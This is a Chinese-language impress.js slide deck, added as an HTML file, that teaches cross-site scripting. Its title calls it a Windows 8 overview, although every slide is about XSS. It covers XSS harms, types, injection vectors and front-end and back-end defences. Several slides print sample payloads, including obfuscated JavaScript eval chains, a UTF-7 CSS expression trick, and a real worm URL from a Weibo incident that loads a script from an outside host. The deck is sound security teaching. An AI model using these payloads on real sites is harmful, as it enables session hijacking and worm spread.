@@ -1,0 +1,269 @@
+﻿<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="UTF-8">
+	<title>Windows 8 Platform Overview @Ken Xu | powered by impress.js</title>
+	<link rel="stylesheet" href="css/impress.css" />
+</head>
+<body>
+<div id="badge" title="HTML5 Powered with CSS3 / Styling, Graphics, 3D & Effects, and Semantics." ></div>
+<div id="impress" class="impress-not-supported">
+	<div id="step1" class="step" data-x="0" data-y="-1000" data-rotate="90">
+		<section class="title">
+			<h1>Windows 8 Platform Overview</h1>
+			<h2><a href="//weibo.com/1882027032" target="_blank">Ken Xu</a></h2>
+		</section>
+	</div>
+	<div id="what" class="step" data-x="1000" data-y="-1000">
+		<h1 class="header">XSS是什么</h1>
+	</div>
+	<div id="step2" class="step slide" data-x="1000" data-y="0" >
+		<h1>XSS是什么</h1>
+		<ul>
+			<li>跨网站脚本（Cross-site scripting，XSS）</li>
+			<li>是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</li>
+		</ul>
+		<footer>
+			<a href="http://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank">维基百科</a>
+		</footer>
+	</div>
+	<div id="step3" class="step slide" data-x="2000" data-y="0">
+		<h1>无处不在的XSS</h1>
+		<img src="img/xss1.png" style="max-height:550px" />
+		<footer>
+			<a href="http://www.wooyun.org">www.wooyun.org</a>
+		</footer>
+	</div>
+	<div id="step4" class="step slide" data-x="3000" data-y="0">
+		<h1>新浪漏洞类型统计</h1>
+		<img src="img/xss2.png" alt="" />
+		<footer>
+			<a href="http://www.wooyun.org/corps/%E6%96%B0%E6%B5%AA">http://www.wooyun.org/corps/%E6%96%B0%E6%B5%AA</a>
+		</footer>
+	</div>
+	<div class="step" data-x="3000" data-y="-1000" data-rotate="90">
+		<h1 class="header">XSS危害？</h1>
+	</div>
+	<div id="step5" class="step slide" data-x="4000" data-y="0">
+		<h1>XSS危害</h1>
+		<ul>
+			<li>alert('XSS');</li>
+			<li>一个alert有什么了不起？</li>
+		</ul>
+		<div class="center">
+			<img src="img/xss3.png" />	
+		</div>
+		
+	</div>
+	<div id="step6" class="step slide" data-x="5000" data-y="0">
+		<h1>XSS危害</h1>
+		<h2>挂马</h2>
+		<ul>
+			<li>插入恶意的脚本内容，运行病毒、木马</li>
+		</ul>
+	</div>
+	<div id="step7" class="step slide" data-x="5000" data-y="1000">
+		<h1>XSS危害</h1>
+		<h2>钓鱼</h2>
+		<ul>
+			<li>篡改网页内容，骗取账号、密码等诈骗行为</li>
+		</ul>
+		<div class="center">
+			<img src="img/xss4.png" alt="" />
+		</div>
+		
+	</div>
+	<div id="step8" class="step slide" data-x="4000" data-y="1000">
+		<h1>XSS危害</h1>
+		<h2>劫持会话</h2>
+		<ul>
+			<li>获取会话 COOKIE, 传送给第三方劫持身份</li>
+		</ul>
+		<h2>案例</h2>
+		<ul>
+			<li>发微博、人人网后台</li>
+		</ul>
+		<img src="img/xss5.png" alt="" />
+	</div>
+	<div id="step9" class="step slide" data-x="3000" data-y="1000">
+		<h1>XSS危害</h1>
+		<h2>xss蠕虫</h2>
+		<ul>
+			<li>使用 Ajax 技术，呈现链式传播</li>
+		</ul>
+		<h2>案例</h2>
+		<ul>
+			<li>微博6.28 xss事件</li>
+			<li>http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update</li>
+		</ul>
+		<img src="img/xss6.png" alt="" />
+	</div>
+	<div id="step10" class="step slide" data-x="2000" data-y="1000">
+		<h1>XSS分类</h1>
+		<h2>持久型</h2>
+		<ul>
+			<li>cookie</li>
+			<li>数据库</li>
+		</ul>
+		<h2>非持久型</h2>
+		<ul>
+			<li>URL，Form</li>
+		</ul>
+	</div>
+	<div id="step11" class="step slide" data-x="1000" data-y="1000">
+		<h1>XSS产生原因</h1>
+		<ul>
+			<li>javascript的语法特性</li>
+			<li>无处不在的javascript</li>
+			<li>相信用户都是“良民”</li>
+			<li>太依赖前端验证</li>
+			<li>浏览器缺陷</li>
+			<li>……</li>
+		</ul>
+	</div>
+	<div id="step12" class="step slide" data-x="0" data-y="1000">
+		<h1>常见XSS</h1>
+		<h2>javascript 代码注入</h2>
+		<ul>
+			<li>eval</li>
+			<li>setTimeout/setInterval</li>
+			<li>document.write</li>
+			<li>location.href</li>
+			<li>new Function()</li>
+			<li>fromCharCode</li>
+			<li>获取到不信任的字符串</li>
+		</ul>
+	</div>
+	<div id="step13" class="step slide" data-x="0" data-y="2000">
+		<h1>猥琐的javascript</h1>
+		<ul>
+			<li>String.fromCharCode(88,83,83)</li>
+			<li>'\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029'.replace(/\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029/,\u0065\u0076\u0061\u006c)</li>
+			<li>_=+[];$=_++;__=(_<<_);___=(_<<_)+_;____=__+__;_____=__+___;$$=({}+"")[_____]+({}+"")[_]+({}[$]+"")[_]+(($!=$)+"")[___]+(($==$)+"")[$]+(($==$)+"")[_]+(($==$)+"")[__]+({}+"")[_____]+(($==$)+"")[$]+({}+"")[_]+(($==$)+"")[_];$$$=(($!=$)+"")[_]+(($!=$)+"")[__]+(($==$)+"")[___]+(($==$)+"")[_]+(($==$)+"")[$];$_$=({}+"")[_____]+({}+"")[_]+({}+"")[_]+(($!=$)+"")[__]+({}+"")[__+_____]+({}+"")[_____]+ ({}+"")[_]+({}[$]+"")[__]+(($==$)+"")[___]; ($)[$$][$$]($$$+"('"+$_$+"')")()</li>
+		</ul>
+	</div>
+	<div id="step14" class="step slide" data-x="1000" data-y="2000">
+		<h1>常见XSS</h1>
+		<h2>HTML 标签注入</h2>
+		<ul>
+			<li>< > " '  \ & #</li>
+			<li>src=javascript:alert('xss')</li>
+			<li>onerror/onclick</li>
+			<li>href=javascript:alert('xss')</li>
+			<li>更多变型：<a href="http://ha.ckers.org/xss.html">http://ha.ckers.org/xss.html</a></li>
+		</ul>
+	</div>
+	<div id="step15" class="step slide" data-x="2000" data-y="2000">
+		<h1>常见XSS</h1>
+		<h2>css注入</h2>
+		<ul>
+			<li>expression </li>
+			<li>url("javascript:alert('xss')")</li>
+			<li>@import </li>
+			<li>/**/ </li>
+			<li>@charset</li>
+			<li>更多变型：<a href="http://ha.ckers.org/xss.html">http://ha.ckers.org/xss.html</a></li>
+		</ul>
+	</div>
+	<div id="step16" class="step slide" data-x="3000" data-y="2000">
+		<h1>常见XSS</h1>
+		<h2>表单提交</h2>
+		<ul>
+			<li>$_GET </li>
+			<li>$_POST</li>
+			<li>$_FILE</li>
+			<li>type="hidden"</li>
+		</ul>
+	</div>
+	<div id="step17" class="step slide" data-x="4000" data-y="2000">
+		<h1>常见XSS</h1>
+		<h2>XSS Rootkit</h2>
+		<ul>
+			<li>$_COOKIE </li>
+			<li>$_SERVER</li>
+		</ul>
+		<h2>实例</h2>
+		<ul>
+			<li>getenv('HTTP_CLIENT_IP')</li>
+			<li>getenv('HTTP_X_FORWARDED_FOR')</li>
+		</ul>
+	</div>
+	<div id="step18" class="step slide" data-x="5000" data-y="2000">
+		<h1>常见XSS</h1>
+		<h2>富文本编辑器</h2>
+		<ul>
+			<li>形式千变万化 </li>
+			<li>博客</li>
+			<li>轻微博</li>
+			<li>UBB代码</li>
+			<li>更多变型：<a href="http://ha.ckers.org/xss.html">http://ha.ckers.org/xss.html</a></li>
+		</ul>
+	</div>
+	<div id="step19" class="step slide" data-x="5000" data-y="3000">
+		<h1>常见XSS</h1>
+		<h2>字符集编码</h2>
+		<ul>
+			<li>@charset "utf-7"; </li>
+		</ul>
+		<p>body{80sec:expre/+ACoAKg/ssion(if(!window.x){alert(1);window.x=1})}</p>
+		<p>@charset  "utf-7"：表明了css代码的编码格式为 utf-7，而根据utf-7的编码规则，是由 “+”开始，“-”结束的一堆代码（- 结尾非必要）。</p>
+		<p>那么 +ACoAKg-  即utf-7编码格式，经由浏览器转换成gbk之后，就变成了  /**/，变成css注释，代码实际变为：</p>
+		<p>expression(if(!window.x){alert(1);window.x=1})  </p>
+	</div>
+	<div id="step20" class="step slide" data-x="4000" data-y="3000">
+		<h1>常见XSS</h1>
+		<h2>flashvars</h2>
+		<ul>
+			<li>js可以跟flash通过flashvars进行交互 </li>
+			<li>flash crossdomain.xml跨域</li>
+		</ul>
+	</div>
+	<div id="step21" class="step slide" data-x="3000" data-y="3000">
+		<h1>XSS防范</h1>
+		<h2>前端策略</h2>
+		<ul>
+			<li>慎用之前提到的eval等函数</li>
+			<li>安全的cookie策略，增加客户端属性</li>
+			<li>统一编码UTF-8</li>
+			<li>ajax提交参数使用encodeURIComponent编码</li>
+			<li>注意字符转义</li>
+			<li>慎用document.domain</li>
+			<li>禁止引入第三方js、css文件</li>
+		</ul>
+	</div>
+	<div id="step22" class="step slide" data-x="2000" data-y="3000">
+		<h1>XSS防范</h1>
+		<h2>后端防范</h2>
+		<ul>
+			<li>永远不要相信用户输入的内容！</li>
+			<li>$_GET、$_POST、$_REQUEST、$_SERVER、$_COOKIE、$_FILE、$_ENV</li>
+			<li>尽量采用post</li>
+			<li>输入类型、验证、过滤、转义；输出内容编码</li>
+			<li>SQL安全：mysql_real_escape_string</li>
+			<li>refer检查</li>
+			<li>白(黑)名单策略：标签白名单、refer白名单</li>
+			<li>session</li>
+		</ul>
+	</div>
+	<div id="step23" class="step slide" data-x="1000" data-y="3000">
+		<h1>资料</h1>
+		<ul>
+			<li>http://www.80sec.com</li>
+			<li>http://www.wooyun.org</li>
+			<li>http://xssed.com</li>
+			<li>http://ha.ckers.org/xss.html</li>
+			<li>http://html5sec.org/</li>
+		</ul>
+	</div>
+	<div id="big" class="step" data-x="-450" data-y="3000" data-rotate="180" data-scale="6">
+        <p> Question? <b>Q&A</b></p>
+    </div>
+	<div id="tiny" class="step" data-x="140" data-y="2860" data-z="-3000" data-rotate="300" data-scale="1">
+        <p>The End<br/><b>Thank You</b></p>
+    </div>
+	<div id="overview" class="step" data-x="2500" data-y="1500" data-scale="6">
+    </div>
+<script type="text/javascript" src="js/impress.js"></script>
+</div>
+</body>
+</html>
